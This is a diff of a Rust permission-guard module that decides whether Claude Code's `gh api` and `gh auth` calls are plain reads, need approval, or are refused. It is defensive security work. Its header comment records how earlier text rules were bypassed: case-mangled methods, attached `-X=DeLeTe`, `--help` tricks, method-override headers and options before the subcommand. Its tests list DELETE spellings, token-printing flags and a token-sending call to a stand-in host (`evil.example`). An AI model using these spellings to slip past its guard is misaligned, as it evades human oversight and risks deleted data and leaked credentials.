@@ -1,298 +1,162 @@
-//! What a `gh api` or `gh auth status` call does, read the way gh's own
-//! flag parser (pflag) reads its arguments (TSK-1070 security review round
-//! 2). Claude Code runs these subcommands outside its sandbox by name, and
-//! its permission rules match command text, so a list of spellings never
-//! closes: `-X PoSt`, `-X=DeLeTe` and `-iXDELETE` each reached the API past
-//! the text rules. Exec-guard reads the arguments here instead, with every
-//! form pflag accepts: a separated value, an attached value, `=` after a
-//! short or long name, short-option bundles, and the method in any case,
-//! since gh upper-cases it before sending. A form this reader cannot be sure
-//! of, such as a word the shell fills in or an option gh does not have, is
-//! refused rather than guessed.
+//! What a `gh api` or `gh auth` call does, judged against one narrow
+//! allowlist (TSK-1070 security review round 3). Claude Code runs these
+//! subcommands outside its sandbox by name, and its permission rules match
+//! command text, so a list of spellings never closes. Round 2 read the
+//! arguments by gh's own option grammar instead; round 3 showed that a
+//! model of that grammar does not close either (a superseded `--help`, an
+//! override header, an option before the subcommand). So exec-guard no
+//! longer models it:
+//!
+//! - a `gh api` call is a read only in one plain form, a GET to one
+//!   endpoint with output options; every other form asks the person;
+//! - a word naming DELETE anywhere in a `gh api` call is refused;
+//! - a `gh auth` call with the token flag anywhere, or with an option
+//!   before its subcommand, is refused;
+//! - a word the shell fills in is refused, since it could be any of these.
+
+use crate::hooks::git_guard::expands;
 
 /// What one `gh api` call does.
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub(crate) enum Intent {
-    /// A GET or HEAD to the configured GitHub host.
+    /// The plain read form: no prompt.
     Read,
-    /// A call that changes something or reaches another host; the reason
-    /// names which. Claude asks the person before it runs.
+    /// Any other form; the reason names what took it outside the plain
+    /// read form. Claude asks the person before it runs.
     Write(String),
-    /// A DELETE in any spelling: refused.
+    /// A word naming DELETE, in any spelling or position: refused.
     Delete,
-    /// A form the reader cannot be sure of: refused, with the reason.
+    /// A word the shell fills in: refused, with the reason.
     Unread(String),
 }
 
-/// `gh api` short options that take a value (gh 2.x `gh api --help`).
-const API_VALUE_SHORT: &[char] = &['F', 'H', 'X', 'f', 'p', 'q', 't'];
-/// `gh api` short options that take none.
-const API_FLAG_SHORT: &[char] = &['i', 'h'];
-/// `gh api` long options that take a value.
-const API_VALUE_LONG: &[&str] = &[
-    "cache",
-    "field",
-    "header",
-    "hostname",
-    "input",
-    "jq",
-    "method",
-    "preview",
-    "raw-field",
-    "template",
-];
-/// `gh api` long options that take none.
-const API_FLAG_LONG: &[&str] = &["include", "paginate", "silent", "slurp", "verbose", "help"];
-
-/// One option as pflag reads it: its canonical long name and its value
-/// (`None` for a flag given no `=` value).
-struct ReadOption {
-    name: &'static str,
-    value: Option<String>,
+/// What one `gh auth` call does.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub(crate) enum Auth {
+    /// No token flag and no option before the subcommand.
+    Plain,
+    /// The token flag, or an option before the subcommand: refused as a
+    /// `forge_exec` action.
+    Refused,
+    /// A word the shell fills in: refused, with the reason.
+    Unread(String),
 }
 
-fn api_long(short: char) -> &'static str {
-    match short {
-        'F' => "field",
-        'H' => "header",
-        'X' => "method",
-        'f' => "raw-field",
-        'p' => "preview",
-        'q' => "jq",
-        't' => "template",
-        'i' => "include",
-        _ => "help",
+/// Options the plain read form takes with a value, as a separate word or
+/// after `=` on the long name.
+const READ_VALUE: &[&str] = &["-q", "--jq", "-t", "--template", "--cache"];
+/// Options the plain read form takes without a value.
+const READ_FLAG: &[&str] = &["-i", "--include", "--paginate", "--slurp", "--silent"];
+
+/// Whether a word names DELETE: the method word itself, an option with the
+/// method attached (`-XDELETE`, `--method=delete`), or a header value
+/// (`X-HTTP-Method-Override: DELETE`), in any case. An endpoint path such
+/// as `branches/delete-me` is not one.
+fn names_delete(word: &str) -> bool {
+    let lower = word.trim().to_ascii_lowercase();
+    lower.contains("delete") && (lower == "delete" || lower.starts_with('-') || lower.contains(':'))
+}
+
+fn unread(word: &str) -> String {
+    format!("`{word}` is filled in by the shell, so the guard cannot see what gh receives")
+}
+
+/// What a `gh api` call with these arguments (the words after `api`) does.
+pub(crate) fn api_intent(args: &[String]) -> Intent {
+    if let Some(word) = args.iter().find(|w| expands(w)) {
+        return Intent::Unread(unread(word));
     }
-}
-
-/// Split `args` into options and positional words the way pflag does for a
-/// command with the given options. `Err` names a form pflag would read
-/// differently from this reader, or one gh rejects.
-#[allow(clippy::type_complexity)]
-fn parse(
-    args: &[String],
-    value_short: &[char],
-    flag_short: &[char],
-    value_long: &[&'static str],
-    flag_long: &[&'static str],
-    long_of: fn(char) -> &'static str,
-) -> Result<(Vec<ReadOption>, Vec<String>), String> {
-    let mut options = Vec::new();
-    let mut positional = Vec::new();
+    if args.iter().any(|w| names_delete(w)) {
+        return Intent::Delete;
+    }
+    let outside = |what: String| Intent::Write(format!("{what}, outside the plain read form"));
+    let mut endpoints = Vec::new();
     let mut words = args.iter();
     while let Some(word) = words.next() {
-        if crate::hooks::git_guard::expands(word) {
-            return Err(format!(
-                "`{word}` is filled in by the shell, so the guard cannot see what gh receives"
-            ));
-        }
-        if word == "--" {
-            for rest in words.by_ref() {
-                if crate::hooks::git_guard::expands(rest) {
-                    return Err(format!(
-                        "`{rest}` is filled in by the shell, so the guard cannot see what gh receives"
-                    ));
-                }
-                positional.push(rest.clone());
-            }
-            break;
-        }
-        if let Some(long) = word.strip_prefix("--") {
-            let (name, attached) = match long.split_once('=') {
-                Some((name, value)) => (name, Some(value.to_string())),
-                None => (long, None),
-            };
-            if let Some(&canonical) = value_long.iter().find(|n| **n == name) {
-                let value = match attached {
-                    Some(value) => value,
-                    None => next_value(&mut words, word)?,
-                };
-                options.push(ReadOption {
-                    name: canonical,
-                    value: Some(value),
-                });
-            } else if let Some(&canonical) = flag_long.iter().find(|n| **n == name) {
-                options.push(ReadOption {
-                    name: canonical,
-                    value: attached,
-                });
-            } else {
-                return Err(format!("`--{name}` is not an option of this gh command"));
-            }
+        if !word.starts_with('-') {
+            endpoints.push(word);
             continue;
         }
-        let Some(shorts) = word.strip_prefix('-').filter(|s| !s.is_empty()) else {
-            positional.push(word.clone());
-            continue;
-        };
-        let chars: Vec<char> = shorts.chars().collect();
-        let mut at = 0;
-        while let Some(&letter) = chars.get(at) {
-            let rest: String = chars[at + 1..].iter().collect();
-            if value_short.contains(&letter) {
-                let value = if let Some(value) = rest.strip_prefix('=') {
-                    value.to_string()
-                } else if !rest.is_empty() {
-                    rest
-                } else {
-                    next_value(&mut words, word)?
-                };
-                options.push(ReadOption {
-                    name: long_of(letter),
-                    value: Some(value),
-                });
-                break;
+        if matches!(word.as_str(), "-X" | "--method") {
+            match words.next() {
+                Some(method) if method.eq_ignore_ascii_case("GET") => continue,
+                Some(method) => return outside(format!("uses the method `{method}`")),
+                None => return outside(format!("gives `{word}` no value")),
             }
-            if flag_short.contains(&letter) {
-                if let Some(value) = rest.strip_prefix('=') {
-                    options.push(ReadOption {
-                        name: long_of(letter),
-                        value: Some(value.to_string()),
-                    });
-                    break;
-                }
-                options.push(ReadOption {
-                    name: long_of(letter),
-                    value: None,
-                });
-                at += 1;
+        }
+        if let Some(method) = word.strip_prefix("--method=") {
+            if method.eq_ignore_ascii_case("GET") {
                 continue;
             }
-            return Err(format!(
-                "`-{letter}` in `{word}` is not an option of this gh command"
-            ));
+            return outside(format!("uses the method `{method}`"));
         }
-    }
-    Ok((options, positional))
-}
-
-fn next_value<'a>(
-    words: &mut impl Iterator<Item = &'a String>,
-    option: &str,
-) -> Result<String, String> {
-    let value = words
-        .next()
-        .ok_or_else(|| format!("`{option}` has no value"))?;
-    if crate::hooks::git_guard::expands(value) {
-        return Err(format!(
-            "the value of `{option}` is filled in by the shell, so the guard cannot see it"
-        ));
-    }
-    Ok(value.clone())
-}
-
-/// What the `gh api` call with these arguments (the words after `api`)
-/// does.
-pub(crate) fn api_intent(args: &[String]) -> Intent {
-    let (options, positional) = match parse(
-        args,
-        API_VALUE_SHORT,
-        API_FLAG_SHORT,
-        API_VALUE_LONG,
-        API_FLAG_LONG,
-        api_long,
-    ) {
-        Ok(parsed) => parsed,
-        Err(why) => return Intent::Unread(why),
-    };
-    if options
-        .iter()
-        .any(|o| o.name == "help" && o.value.as_deref().is_none_or(truthy))
-    {
-        return Intent::Read;
-    }
-    let mut methods = Vec::new();
-    for option in &options {
-        let value = option.value.as_deref().unwrap_or_default();
-        match option.name {
-            "method" => methods.push(value.to_string()),
-            // A method override header changes the method the API applies.
-            "header" => {
-                if let Some((name, rest)) = value.split_once(':') {
-                    if name.trim().eq_ignore_ascii_case("x-http-method-override") {
-                        methods.push(rest.trim().to_string());
-                    }
-                }
+        if READ_VALUE.contains(&word.as_str()) {
+            if words.next().is_none() {
+                return outside(format!("gives `{word}` no value"));
             }
-            _ => {}
+            continue;
         }
+        if READ_FLAG.contains(&word.as_str())
+            || ["--jq=", "--template=", "--cache="]
+                .iter()
+                .any(|p| word.starts_with(p))
+        {
+            continue;
+        }
+        return outside(format!("uses `{word}`"));
     }
-    for method in &methods {
-        if method.is_empty() || !method.chars().all(|c| c.is_ascii_alphabetic()) {
-            return Intent::Unread(format!("the method `{method}` is not a plain HTTP method"));
-        }
-        if method.eq_ignore_ascii_case("DELETE") {
-            return Intent::Delete;
-        }
-    }
-    let endpoint = match positional.as_slice() {
-        [] => return Intent::Read,
+    let endpoint = match endpoints.as_slice() {
         [endpoint] => endpoint,
-        [_, extra, ..] => {
-            return Intent::Unread(format!(
-                "`{extra}` is a second endpoint; gh takes one, so the guard cannot tell which runs"
-            ))
-        }
+        [] => return outside("names no endpoint".to_string()),
+        _ => return outside("names more than one endpoint".to_string()),
     };
-    let body = options
-        .iter()
-        .any(|o| matches!(o.name, "field" | "raw-field" | "input"));
-    let method = methods.last().map_or_else(
-        || if body { "POST" } else { "GET" }.to_string(),
-        |m| m.to_ascii_uppercase(),
-    );
     if endpoint.contains("://") || endpoint.starts_with("//") {
-        return Intent::Write(format!(
-            "names its own host in `{endpoint}`, so the token goes where the URL points"
-        ));
-    }
-    if options.iter().any(|o| o.name == "hostname") {
-        return Intent::Write("sends the token to the host `--hostname` names".to_string());
+        return outside(format!("names its own host in `{endpoint}`"));
     }
     if endpoint
         .trim_start_matches('/')
         .eq_ignore_ascii_case("graphql")
     {
-        return Intent::Write(
-            "is a GraphQL call, where a mutation and a query share one form".to_string(),
-        );
+        return outside("is a GraphQL call".to_string());
     }
-    if matches!(method.as_str(), "GET" | "HEAD") {
-        Intent::Read
+    Intent::Read
+}
+
+/// What a `gh` call whose first word is an option does, when `api` is
+/// among its words. Which word gh takes as the subcommand depends on which
+/// of those options take a value, so the call is never the plain read
+/// form.
+pub(crate) fn api_after_options(rest: &[String]) -> Intent {
+    match api_intent(rest) {
+        Intent::Read | Intent::Write(_) => {
+            Intent::Write("has an option before `api`, outside the plain read form".to_string())
+        }
+        refused => refused,
+    }
+}
+
+/// Whether a word is gh's token flag: `--show-token` with or without a
+/// value, or a short option word holding `t`, in any case.
+fn shows_token(word: &str) -> bool {
+    let lower = word.to_ascii_lowercase();
+    if let Some(long) = lower.strip_prefix("--") {
+        long == "show-token" || long.starts_with("show-token=")
     } else {
-        Intent::Write(format!("sends a {method} request"))
+        lower.strip_prefix('-').is_some_and(|s| s.contains('t'))
     }
 }
 
-/// pflag's reading of a boolean flag's `=` value.
-fn truthy(value: &str) -> bool {
-    matches!(value, "1" | "t" | "T" | "true" | "TRUE" | "True")
-}
-
-fn auth_long(short: char) -> &'static str {
-    match short {
-        'a' => "active",
-        't' => "show-token",
-        'h' => "hostname",
-        _ => "help",
+/// What a `gh auth` call with these arguments (the words after `auth`)
+/// does.
+pub(crate) fn auth_intent(args: &[String]) -> Auth {
+    if let Some(word) = args.iter().find(|w| expands(w)) {
+        return Auth::Unread(unread(word));
     }
-}
-
-/// Whether `gh auth status` with these arguments (the words after
-/// `status`) prints the token: `-t` or `--show-token` in any bundle or `=`
-/// form. `Err` names a form the reader cannot be sure of.
-pub(crate) fn auth_status_shows_token(args: &[String]) -> Result<bool, String> {
-    let (options, _) = parse(
-        args,
-        &['h'],
-        &['a', 't'],
-        &["hostname"],
-        &["active", "show-token", "help"],
-        auth_long,
-    )?;
-    Ok(options
-        .iter()
-        .any(|o| o.name == "show-token" && o.value.as_deref().is_none_or(truthy)))
+    // An option before the subcommand, or the token flag anywhere.
+    if args.first().is_some_and(|w| w.starts_with('-')) || args.iter().any(|w| shows_token(w)) {
+        return Auth::Refused;
+    }
+    Auth::Plain
 }
 
 #[cfg(test)]
@@ -308,7 +172,7 @@ mod tests {
     }
 
     #[test]
-    fn every_delete_spelling_is_a_delete() {
+    fn every_delete_word_is_refused_in_any_position() {
         for line in [
             "repos/o/r -X DELETE",
             "repos/o/r -X delete",
@@ -323,13 +187,18 @@ mod tests {
             "-X GET repos/o/r -X Delete",
             "repos/o/r -H X-HTTP-Method-Override:DELETE",
             "repos/o/r --header=x-http-method-override:delete",
+            "repos/o/r -X=DeLeTe --help --help=false",
+            "repos/o/r -X=DeLeTe --help=false --help",
+            "repos/o/r -X GET -H X-HTTP-Method-Override:dElEtE",
+            "repos/o/r -H X-HTTP-Method-Override:dElEtE -X GET",
+            "repos/o/r -q -XDELETE",
         ] {
             assert_eq!(intent(line), Intent::Delete, "{line}");
         }
     }
 
     #[test]
-    fn writes_are_read_in_every_spelling_and_case() {
+    fn every_form_outside_the_plain_read_asks() {
         for line in [
             "repos/o/r/actions/runs/1/rerun -X PoSt",
             "repos/o/r -X post",
@@ -351,70 +220,106 @@ mod tests {
             "repos/o/r --hostname evil.example",
             "https://example.invalid/review-canary",
             "repos/o/r -X OPTIONS",
+            "repos/o/r -X HEAD",
+            "repos/o/r -XGET",
+            "repos/o/r -X GET -X POST",
+            "search/issues -X GET -f q=repo:o/r",
+            "repos/o/r -X PoSt --help --help=false",
+            "repos/o/r -X PoSt --help=false --help",
+            "repos/o/r --help",
+            "repos/o/r -h",
+            "--help",
+            "repos/o/r -X PoSt -H X-HTTP-Method-Override:GET",
+            "repos/o/r -H X-HTTP-Method-Override:GET -X PoSt",
+            "repos/o/r -H Accept:application/json",
+            "repos/o/r --verbose",
+            "repos/o/r --paginate=false",
+            "repos/o/r --metod POST",
+            "repos/o/r -- other",
+            "repos/o/r other/endpoint",
+            "repos/o/r -X",
+            "repos/o/r -q",
+            "",
         ] {
             assert!(matches!(intent(line), Intent::Write(_)), "{line}");
         }
     }
 
     #[test]
-    fn reads_stay_reads() {
+    fn the_plain_read_form_is_a_read() {
         for line in [
             "repos/o/r",
             "repos/o/r/pulls/1 --jq .head.sha",
             "repos/o/r -X GET",
-            "repos/o/r -Xget",
-            "search/issues -X GET -f q=repo:o/r",
-            "repos/o/r --paginate --slurp -q .[]",
-            "repos/o/r -i",
-            "repos/o/r -X HEAD",
-            "--help",
+            "repos/o/r -X get",
+            "repos/o/r --method=GET",
+            "repos/o/r --paginate --slurp -q .name",
+            "repos/o/r -i --silent --jq=.name --template={{.name}} --cache 1h",
+            "repos/o/r/git/refs/heads/delete-me",
         ] {
             assert_eq!(intent(line), Intent::Read, "{line}");
         }
     }
 
     #[test]
-    fn forms_the_reader_cannot_be_sure_of_are_refused() {
+    fn a_word_the_shell_fills_in_is_refused() {
         for line in [
             "repos/o/r -X $M",
             "repos/o/r $FLAGS",
             "repos/o/r/pulls/$N",
-            "repos/o/r -Z",
-            "repos/o/r --metod POST",
-            "repos/o/r --METHOD POST",
-            "repos/o/r -X",
             "repos/o/r -X PO$T",
-            "repos/o/r -X 'POST",
-            "repos/o/r other/endpoint",
+            "repos/o/r -X `m`",
         ] {
             assert!(matches!(intent(line), Intent::Unread(_)), "{line}");
         }
     }
 
     #[test]
-    fn the_token_flag_is_read_in_every_form() {
+    fn an_option_before_api_never_reads() {
+        assert_eq!(
+            api_after_options(&words("-X=DeLeTe api repos/o/r")),
+            Intent::Delete
+        );
+        assert_eq!(
+            api_after_options(&words("-X DELETE api repos/o/r")),
+            Intent::Delete
+        );
+        for line in ["-R o/r api repos/o/r", "--hostname=x api repos/o/r"] {
+            assert!(
+                matches!(api_after_options(&words(line)), Intent::Write(_)),
+                "{line}"
+            );
+        }
+    }
+
+    #[test]
+    fn the_token_flag_or_an_early_option_refuses_auth() {
         for line in [
-            "-t",
-            "-at",
-            "-ta",
-            "--show-token",
-            "--show-token=true",
-            "-h github.com -t",
-            "-t=true",
+            "status -t",
+            "status -at",
+            "status -ta",
+            "status -aT",
+            "status --show-token",
+            "status --SHOW-TOKEN",
+            "status --show-token=true",
+            "status --show-token=false",
+            "status -h github.com -t",
+            "status -t=true",
+            "--show-token=true status",
+            "-t status",
+            "-h github.com status",
+            "token -t",
         ] {
-            assert_eq!(auth_status_shows_token(&words(line)), Ok(true), "{line}");
+            assert!(auth_intent(&words(line)) == Auth::Refused, "{line}");
         }
         for line in [
-            "",
-            "-a",
-            "-h github.com",
-            "-ht",
-            "--show-token=false",
-            "--hostname=x",
+            "status",
+            "status -a",
+            "status -h github.com",
+            "status --hostname=x",
         ] {
-            assert_eq!(auth_status_shows_token(&words(line)), Ok(false), "{line}");
+            assert_eq!(auth_intent(&words(line)), Auth::Plain, "{line}");
         }
-        assert!(auth_status_shows_token(&words("-x")).is_err());
-        assert!(auth_status_shows_token(&words("$T")).is_err());
+        assert!(matches!(auth_intent(&words("status $T")), Auth::Unread(_)));
     }
 }
